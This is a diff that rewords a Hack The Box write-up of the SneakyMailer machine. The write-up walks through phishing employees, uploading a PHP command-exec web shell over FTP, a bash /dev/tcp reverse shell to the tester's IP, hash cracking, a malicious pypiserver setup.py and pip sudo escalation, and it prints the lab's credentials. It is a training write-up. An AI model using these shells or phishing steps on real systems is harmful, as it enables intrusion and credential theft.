@@ -6,20 +6,20 @@ points: 30
 rating: 3.9
 date: 2020-07-11
 avatar: assets/htb/sneakymailer.png
-source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/SneakyMailer
 ---
+
 ## Useful Skills and Tools
 
 #### Save a transcript of any session \(even remote nc sessions!\)
 
-* With the command `script $log_filename` you can save the output of any session, including stderr and output from programs such as nano and vim! This is extremely invaluable when you exit a session and have forgotten to copy or backup something you did. To stop the transcript type `exit` after exiting any shells you may have spawned during that session.
+* The `script $log_filename` command records the entire output of a session, stderr included, plus output from interactive programs like nano and vim! That's a lifesaver when you close a session and realize you never copied or backed something up. To end the transcript, type `exit` once you've left any shells you spawned during the session.
 
 ## Enumeration
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
+I kicked things off by running an nmap scan against `<YOUR_IP>`. My usual flags are: `-p-` to cover every port, `-sC` (the same as `--script=default`) to fire the default set of enumeration scripts at the host, `-sV` for service detection, and `-oA <name>` to write the results out under the filename `<name>`.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/sneakymailer]
@@ -135,27 +135,27 @@ ftp> exit
 221 Goodbye.
 ```
 
-First I tried anonymous login through FTP, but was denied access.
+My first move was an anonymous FTP login, which the server refused.
 
 ### Port 80 - HTTP
 
-port 80 - redirected to [http://sneakycorp.htb/](http://sneakycorp.htb/) - added to /etc/hosts
+port 80 redirected me to [http://sneakycorp.htb/](http://sneakycorp.htb/), so I added the hostname to /etc/hosts
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-sneakycorp.png)
+![](assets/wu/sneakymailer/img-1.png)
 
-After adding the domain name to /etc/hosts
+With the domain name now in /etc/hosts
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-messages.png)
+![](assets/wu/sneakymailer/img-2.png)
 
-I found the names Cara Stevens & Bradley Greer from the messages pop-up.  Possible usernames can be extracted from these names using common business username patterns.
+The messages pop-up gave me the names Cara Stevens and Bradley Greer. Names like these can be turned into candidate usernames by applying typical corporate naming conventions.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-messages2.png)
+![](assets/wu/sneakymailer/img-3.png)
 
-I also checked the page source code to see if there was anything interesting in the messages that couldn't be seen in the previews, and found that Bradley Greer was my 'personal tester' and Cara Stevens was the owner of the company.  Both seemed like good targets.
+I also dug through the page source looking for message content that wasn't visible in the previews, and learned that Bradley Greer was my 'personal tester' while Cara Stevens owned the company. Both looked like worthwhile targets.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-users-list.png)
+![](assets/wu/sneakymailer/img-4.png)
 
-On the `/team.php` page there was a listing of company employees.  
+The `/team.php` page listed out the company's employees.  
 
 ```text
 Name    Position    Office    Email
@@ -218,25 +218,23 @@ Zenaida Frank     Software Engineer     New York     zenaidafrank@sneakymailer.h
 Zorita Serrano     Software Engineer     San Francisco     zoritaserrano@sneakymailer.htb
 ```
 
-There was a huge list of employees at the company. I added the usernames and emails to lists for later use
+It was a long roster of employees. I saved the usernames and emails into lists to use later on
 
-{% hint style="info" %}
-I found out afterwards that there is a nice tool that can extract emails from a page: [https://email-checker.net/extract](https://email-checker.net/extract)
-{% endhint %}
+I later discovered a handy tool that pulls email addresses straight out of a page: [https://email-checker.net/extract](https://email-checker.net/extract)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-sneakycorp-register.png)
+![](assets/wu/sneakymailer/img-5.png)
 
-In the source code of the page I also found a reference to a register page at `/pypi/register.php`.  
+The page source also referenced a registration page located at `/pypi/register.php`.  
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-sneakycorp-dirbust-pypi.png)
+![](assets/wu/sneakymailer/img-6.png)
 
-Dirbuster also found this page shortly afterwards, though there wasn't much else to look through.
+Dirbuster picked up this page a little later too, but there wasn't much else worth examining.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-sneakycorp-register2.png)
+![](assets/wu/sneakymailer/img-7.png)
 
-I navigated to this register page and tried to create an account, however it did not seem to be functional.
+I browsed to that registration page and attempted to sign up an account, but it didn't appear to actually work.
 
-typing in pypi.sneakycorp.htb redirects to the main page, loaded ffuf to see if I could find any other virtual hosts
+Entering pypi.sneakycorp.htb just bounced me to the main page, so I fired up ffuf to hunt for additional virtual hosts
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/sneakymailer]
@@ -264,29 +262,29 @@ ________________________________________________
 dev                     [Status: 200, Size: 13737, Words: 4007, Lines: 341]
 ```
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-dev-sneakycorp.png)
+![](assets/wu/sneakymailer/img-8.png)
 
-on dev.sneakycorp.htb found a site that was almost identical to main page, though the register page was visible in a link here. 
+dev.sneakycorp.htb served up a site nearly identical to the main one, except the registration page was linked here. 
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-dev-sneakycorp-register.png)
+![](assets/wu/sneakymailer/img-9.png)
 
-Tried to register again
+Attempted to register once more
 
 ### Port 8080 - HTTP
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-dev-sneakycorp-8080.png)
+![](assets/wu/sneakymailer/img-10.png)
 
-Decided to check out the port 8080 on each of the virtual hosts, dev did not lead anywhere
+I decided to poke at port 8080 across each virtual host; dev was a dead end
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-pypi-sneakycorp-8080.png)
+![](assets/wu/sneakymailer/img-11.png)
 
-, but pypi did: [http://pypi.sneakycorp.htb:8080/](http://pypi.sneakycorp.htb:8080/)
+, but pypi paid off: [http://pypi.sneakycorp.htb:8080/](http://pypi.sneakycorp.htb:8080/)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-pypi-sneakycorp-8080-old.png)
+![](assets/wu/sneakymailer/img-12.png)
 
-found pypiserver version 1.3.2 - newest is 1.4.2
+it was running pypiserver 1.3.2, while the current release was 1.4.2
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-pypi-sneakycorp-8080-auth.png)
+![](assets/wu/sneakymailer/img-13.png)
 
 [https://blog.pentesteracademy.com/learn-to-interact-with-pypi-server-in-3-minutes-71d45fa46273](https://blog.pentesteracademy.com/learn-to-interact-with-pypi-server-in-3-minutes-71d45fa46273)
 
@@ -330,7 +328,7 @@ QUIT
 Connection closed by foreign host.
 ```
 
-[https://www.interserver.net/tips/kb/check-email-address-really-exists-without-sending-email/](https://www.interserver.net/tips/kb/check-email-address-really-exists-without-sending-email/) [https://www.mailenable.com/kb/content/article.asp?ID=ME020207](https://www.mailenable.com/kb/content/article.asp?ID=ME020207) Sent an email to my personal tester greer-san... tested a few addresses, all seem valid
+[https://www.interserver.net/tips/kb/check-email-address-really-exists-without-sending-email/](https://www.interserver.net/tips/kb/check-email-address-really-exists-without-sending-email/) [https://www.mailenable.com/kb/content/article.asp?ID=ME020207](https://www.mailenable.com/kb/content/article.asp?ID=ME020207) I fired off a message to my personal tester greer-san... and after checking a handful of addresses, they all came back as valid
 
 ```text
 msf5 exploit(multi/handler) > use smtp_enum
@@ -373,11 +371,11 @@ msf5 auxiliary(scanner/smtp/smtp_enum) > run
 [*] Auxiliary module execution completed
 ```
 
-verified all the usernames
+confirmed every one of the usernames
 
 ### Sending a phishing email with SMTP
 
-Searched how to interact with SMTP through command line - [https://github.com/jetmore/swaks](https://github.com/jetmore/swaks)
+Looked up how to drive SMTP from the command line - [https://github.com/jetmore/swaks](https://github.com/jetmore/swaks)
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/sneakymailer]
@@ -459,7 +457,7 @@ Searched how to interact with SMTP through command line - [https://github.com/je
 === Connection closed with remote host.
 ```
 
-no reply, so maybe try working local address? also put the "link" on a new line in case whatever script cant parse it for some reason \(maybe the `!`?\)
+got no reply, so I figured I'd try a working local address. I also moved the "link" onto its own line in case some script couldn't parse it for whatever reason \(maybe the `!`?\)
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/sneakymailer]
@@ -583,13 +581,13 @@ no reply, so maybe try working local address? also put the "link" on a new line 
 === Connection closed with remote host.
 ```
 
-going to try restting box since getting no replies to phishing email, also remove `!` from body to see if that causing issues
+since the phishing emails weren't getting any replies, I'm going to reset the box, and also strip the `!` from the body to rule that out as the problem
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-password-capture1.png)
+![](assets/wu/sneakymailer/img-14.png)
 
-Was doing packet capture the whole time trying to see if my messages were being sent/recieved, and finally got a reply back from one
+I'd been running a packet capture throughout to watch whether my messages were going out and coming back, and eventually one of them produced a reply
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-password-capture.png)
+![](assets/wu/sneakymailer/img-15.png)
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/sneakymailer]
@@ -608,13 +606,13 @@ Content-Type: application/x-www-form-urlencoded
 firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
 ```
 
-Got a click! The user Paul Byrd clicked on my link and gave me a \(URL-encoded\) password.
+Got a bite! Paul Byrd followed my link and handed over a \(URL-encoded\) password in the process.
 
 ```text
 firstName=Paul&lastName=Byrd&email=paulbyrd@sneakymailer.htb&password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht&rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
 ```
 
-This decoded to give me a \(super-complicated\) password of:
+Decoding it yielded this \(extremely convoluted\) password:
 
 ```text
 ^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
@@ -622,19 +620,19 @@ This decoded to give me a \(super-complicated\) password of:
 
 ### Reading Paul's mail
 
-Since Paul was nice enough to send me his email password, I decided to log into his mailbox to see what kind of information I could find
+With Paul having handed over his email password, I logged into his mailbox to see what I could turn up
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-thunderbyrd.png)
+![](assets/wu/sneakymailer/img-16.png)
 
-I put in the account information for Paul into my email client and pointed the server towards the target.
+I entered Paul's account details into my email client and aimed the server settings at the target.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-thunderbyrd-sent1.png)
+![](assets/wu/sneakymailer/img-17.png)
 
-After logging into the mailbox I noticed there wasn't anything in the inbox \(probably emptied regularly to keep other players from accidentally clicking on each other's phishing email links\).  There were two messages in the `Sent items` folder, however.  The first was an email to the administrator `root@debian` asking them to change the password for the `developer` account.  He was nice enough to send the old password `m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C` as well.  I made sure to take note of this in case it was used anywhere, or in case the admin hadn't changed it yet.
+Once inside the mailbox the inbox was empty \(likely cleared on a schedule so players don't trip over each other's phishing links\). The `Sent items` folder did contain two messages, though. The first was sent to the administrator `root@debian` requesting a password change for the `developer` account, and it conveniently included the old password `m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C`. I jotted it down in case it was reused somewhere, or in case the admin hadn't rotated it yet.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-thunderbyrd-sent2.png)
+![](assets/wu/sneakymailer/img-18.png)
 
-The second email was addressed to `low`, which I thought was another potential username on the machine.  The message laid out a task to "install, test, and then erase" all of the modules in the PyPI service.  I hoped that perhaps Paul had created a script to automate this action, and that I could possibly get it to execute a module I somehow got installed to the service.
+The second message went to `low`, which struck me as another likely username on the box. It described a task to "install, test, and then erase" every module in the PyPI service. My hope was that Paul had automated this with a script, and that I could trick it into running a module I managed to get uploaded to the service.
 
 ```text
 Hello administrator, I want to change this password for the developer account
@@ -645,17 +643,17 @@ Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
 Please notify me when you do it
 ```
 
-Since I now had credentials, I though it would most likely log into the PyPI server I found earlier.  
+Now that I had credentials, my best guess was that they'd work against the PyPI server I'd found earlier.  
 
 ![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-pypi-loggged-in%2520%25281%2529.png)
 
-nothing in packages
+no packages present
 
 ![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-pypi-loggged-in2%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529.png)
 
-nor in the index page
+and nothing on the index page either
 
-However, this did not work, nor did logging into SSH.  I checked back with my nmap scan to see if there were any other services I could try, and noticed port 21 - FTP was open, so I gave it a try.
+That didn't pan out, and neither did SSH. I went back to my nmap results to look for other services to try, spotted that port 21 - FTP was open, and gave it a shot.
 
 ### FTP Enumeration
 
@@ -672,7 +670,7 @@ Remote system type is UNIX.
 Using binary mode to transfer files.
 ```
 
-Using the credentials I had found for the `delevoper` account I was able to login through FTP.
+The `delevoper` account credentials I'd recovered let me log straight into FTP.
 
 ```text
 ftp> ls
@@ -789,7 +787,7 @@ ftp> ls
 226 Directory send OK.
 ```
 
-I was able to successfully login, and began looking around. It appeared as if the ftp server location and files were the same as the live website. I exfiltrated some of the files to my machine for further analysis, but none of the files seemed to have anything interesting in them.
+The login succeeded and I started exploring. The FTP directory and its files looked identical to the live website. I pulled a few files down for closer inspection, but none of them held anything of interest.
 
 ```text
 ftp> put php-code-exec.php
@@ -813,7 +811,7 @@ drwxr-xr-x    8 0        0            4096 May 26 18:52 vendor
 226 Directory send OK.
 ```
 
-After testing some things in the FTP server, I realized that I had the ability to use the PUT command. Since this seemed to be the code for the site, I put a test file to see if I could access it from my browser.
+While experimenting on the FTP server I discovered I could use the PUT command. Since this directory appeared to hold the site's code, I uploaded a test file to check whether I could reach it through my browser.
 
 ```php
 <?php
@@ -826,23 +824,23 @@ system($var);
 
 ## Initial Foothold
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-code-exec.png)
+![](assets/wu/sneakymailer/img-21.png)
 
-Using this I was able to identify that I was running in the context of `www-data`.
+With it I confirmed I was executing as `www-data`.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-etc-passwd.png)
+![](assets/wu/sneakymailer/img-22.png)
 
-, and that there were three users that could log into the machine: low, developer, and root
+, and that three users were able to log into the box: low, developer, and root
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-ssh-key.png)
+![](assets/wu/sneakymailer/img-23.png)
 
-Next I tried adding my public SSH key to both `low` and `developer` since they could log in, but was unable to gain access with SSH since `www-data` could not write to those files.
+I then attempted to drop my public SSH key into both `low` and `developer` since they had login access, but couldn't get in over SSH because `www-data` lacked write permission to those files.
 
 ## Road to User
 
 ### Further enumeration
 
-got running processes, etc/passwd, could not add ssh keys, next tried reverse shell
+grabbed running processes and etc/passwd, couldn't plant SSH keys, so I moved on to a reverse shell
 
 ```text
 GET /php-code-exec.php?var=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.174/46445+0>%261' HTTP/1.1
@@ -858,7 +856,7 @@ DNT: 1
 Sec-GPC: 1
 ```
 
-sent my reverse shell, and immediately got a connection on my waiting netcat listener
+fired off my reverse shell and instantly caught a connection on my netcat listener
 
 ```text
 kac0@kali:~/htb/sneakymailer$ script sneaky-transcript
@@ -884,7 +882,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 sneakymailer
 ```
 
-started enumeration \(remembered to switch to bash this time since zsh seems to have problems with upgrading nc shells\)
+began enumerating \(this time I remembered to drop into bash, since zsh tends to struggle when upgrading nc shells\)
 
 ```text
 www-data@sneakymailer:~/sneakycorp.htb$ cd /home
@@ -900,7 +898,7 @@ drwxr-xr-x  8 low   low   4096 Jun  8 03:47 low
 drwx------  5 vmail vmail 4096 May 19 21:10 vmail
 ```
 
-in the `/home` directory there were only two folders, `low`, and `vmail`
+`/home` held just two directories, `low` and `vmail`
 
 ```text
 www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ ls -la
@@ -933,7 +931,7 @@ www-data@sneakymailer:~/pypi.sneakycorp.htb$ cat .htpasswd
 pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
 ```
 
-found what looked like a hash for a user `pypi` in `.htpasswd` in the `pypi.sneakycorp.htb` folder
+spotted what appeared to be a hash for a `pypi` user inside the `.htpasswd` file in the `pypi.sneakycorp.htb` folder
 
 ```text
 ┌──(kac0㉿kali)-[~]
@@ -961,7 +959,7 @@ Possible Hashs:
 --------------------------------------------------
 ```
 
-the hash came up as type MD5\(APR\)
+the hash was identified as type MD5\(APR\)
 
 ```text
 ┌──(kac0㉿kali)-[~]
@@ -969,7 +967,7 @@ the hash came up as type MD5\(APR\)
    1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR)            | FTP, HTTP, SMTP, LDAP Server
 ```
 
-hashcat's help ID'd it at an Apache MD5 hash
+hashcat's help output pegged it as an Apache MD5 hash
 
 ### Finding user creds
 
@@ -1023,13 +1021,13 @@ Started: Wed Nov 11 15:52:45 2020
 Stopped: Wed Nov 11 15:55:16 2020
 ```
 
-The password enabled me to log in to `http://pypi.sneakycorp.htb:8080/` with the creds `pypi:soufianeelhaoui`
+That password got me into `http://pypi.sneakycorp.htb:8080/` using the creds `pypi:soufianeelhaoui`
 
 ![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-pypi-loggged-in%2520%25281%2529%2520%25281%2529.png)
 
 ![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-pypi-loggged-in2%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25281%2529.png)
 
-There was nothing interesting on either of the sites linked on this page however. 
+Neither of the sites linked from this page had anything useful, though. 
 
 ```text
 www-data@sneakymailer:~/pypkg$ su developer
@@ -1038,7 +1036,7 @@ developer@sneakymailer:/dev/shm/pypkg$ id
 uid=1001(developer) gid=1001(developer) groups=1001(developer)
 ```
 
-I went back to the machine and tried to switch users to `developer` with the credentials mentioned in the email, and found myself logged in as `developer`. 
+Back on the box I attempted to `su` over to `developer` using the password from the email, and it worked, landing me a `developer` session. 
 
 ```text
 developer@sneakymailer:/dev/shm/pypkg$ sudo -l
@@ -1050,7 +1048,7 @@ Sorry, try again.
 Sorry, user developer may not run sudo on sneakymailer.
 ```
 
-I had a weird network hiccup that caused authentication to fail the first try, but then I found out that this user was not able to run commands with `sudo`
+A strange network glitch made authentication fail on my first attempt, but once through I learned this user couldn't run anything via `sudo`
 
 [https://pypi.org/project/pypiserver/\#upload-with-setuptools](https://pypi.org/project/pypiserver/#upload-with-setuptools)
 
@@ -1078,7 +1076,7 @@ I had a weird network hiccup that caused authentication to fail the first try, b
     python setup.py sdist upload -r local
 ```
 
-Then I wrote a setup.py python script as specified at [https://packaging.python.org/tutorials/packaging-projects/\#creating-setup-py](https://packaging.python.org/tutorials/packaging-projects/#creating-setup-py)
+Next I crafted a setup.py python script following the format at [https://packaging.python.org/tutorials/packaging-projects/\#creating-setup-py](https://packaging.python.org/tutorials/packaging-projects/#creating-setup-py)
 
 ```python
 import setuptools
@@ -1109,7 +1107,7 @@ setuptools.setup(
 )
 ```
 
-I first tried writing my public SSH key to `low` but the script was being run in the context of `developer` and not being installed for some reason. I added a check to make sure that `low` \(userID 1000\) was the one running it. Next I followed the instructions to install the package into pypiserver
+My first attempt wrote my public SSH key to `low`, but the script kept running as `developer` and for some reason wasn't getting installed. So I added a guard to confirm that `low` \(userID 1000\) was the one executing it. Then I followed the instructions to publish the package to pypiserver
 
 ```text
 [distutils]
@@ -1127,7 +1125,7 @@ username:pypi
 password:soufianeelhaoui
 ```
 
-I created the `.pypirc` file in my distribution's directory, then set this to be `developer`'s home directory with `export HOME=/dev/shm/pypi`
+I dropped the `.pypirc` file into my distribution's directory, then pointed `developer`'s home there using `export HOME=/dev/shm/pypi`
 
 ### User.txt
 
@@ -1164,7 +1162,7 @@ Server response (200): OK
 WARNING: Uploading via this command is deprecated, use twine to upload instead (https://pypi.org/p/twine/)
 ```
 
-It complained a bit that I didn't create a readme, but it ran
+It grumbled about the missing readme, but it still went through
 
 ```text
 ┌──(kac0㉿kali-[~/htb/sneakymailer]
@@ -1197,7 +1195,7 @@ low@sneakymailer:~$ cat user.txt
 0610************************0a88
 ```
 
-Next I tried logging in with the ssh key I had made and was successful!  I got that same temporary name resolution error when using `sudo -l`, where it seemed to hang for a minute, but this time I got a very interesting result!
+I then logged in with the SSH key I'd generated and it worked!  Running `sudo -l` threw the same temporary name resolution error and hung for a moment, but this time the output was very interesting!
 
 ```text
 low@sneakymailer:/dev/shm/fin$ pip3 install setup.py
@@ -1208,7 +1206,7 @@ Collecting setup.py
 No matching distribution found for setup.py
 ```
 
-A search for ways to privilege escalation with sudo and pip3 led to [https://gtfobins.github.io/gtfobins/pip/](https://gtfobins.github.io/gtfobins/pip/)
+Searching for ways to escalate privileges via sudo and pip3 pointed me to [https://gtfobins.github.io/gtfobins/pip/](https://gtfobins.github.io/gtfobins/pip/)
 
 > File write It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.
 
@@ -1251,7 +1249,7 @@ drwxr-xr-x  2 root root 4096 Nov 11 20:49 pip-egg-info
 /tmp/pip-req-build-2ueqz020
 ```
 
-I was not in the directory I expected at first...the shell spawned in the tmp directory where the "module" was installed to
+At first I wasn't where I expected to be...the shell had spawned inside the tmp directory where the "module" got installed
 
 ### Root.txt
 
